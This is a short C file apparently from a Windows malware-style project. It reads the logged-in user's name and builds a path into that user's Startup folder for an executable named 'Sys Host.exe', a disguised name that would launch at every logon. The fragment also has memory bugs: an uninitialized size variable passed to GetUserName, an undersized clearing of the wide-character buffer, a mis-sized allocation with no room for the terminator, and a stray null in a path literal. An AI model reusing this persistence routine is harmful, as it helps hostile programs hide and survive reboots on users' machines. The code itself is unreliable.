#include "header.h"

char	*ft_strjoin(char const *s1, char const *s2)
{
	char	*str;

	if (s1 && s2)
	{
		str = (char *)malloc(sizeof(char) * (strlen(s1) + strlen(s2) + 1));
		if (!str)
			return (NULL);
		str = strcpy(str, (char *)s1);
		str = strcat(str, (char *)s2);
		return (str);
	}
	return (NULL);
}

char *get_path(void)
{
	wchar_t wname[100];
	unsigned long size_name;
	int i;
	char *name;
	char *path;
	char *temp;

	i = 0;
	memset(wname, 0, 99);
	GetUserName(wname, &size_name);
	wname[size_name] = 0;
	name = (char *)malloc(sizeof(char *) * wcslen(wname));
	i = 0;
	while (i < wcslen(wname))
	{
		name[i] = (char)wname[i];
		i++;
	}
	name[i] = 0;
	path = ft_strjoin("C:\\Users\\\0", name);
	temp = path;
	path = ft_strjoin(path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Sys Host.exe");	
	free(temp);
	free(name);
	return (path);
}